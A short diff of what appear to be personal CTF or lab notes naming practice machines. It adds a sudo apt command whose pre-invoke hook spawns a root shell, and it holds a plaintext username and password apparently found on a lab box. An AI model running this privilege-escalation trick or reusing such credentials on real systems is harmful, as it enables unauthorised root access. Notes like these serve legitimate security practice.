@@ -13,5 +13,6 @@ Venus:
 
 Shenron1:
 Cred in cmt
+sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
 
 jenny:Mypa$$wordi$notharD@123
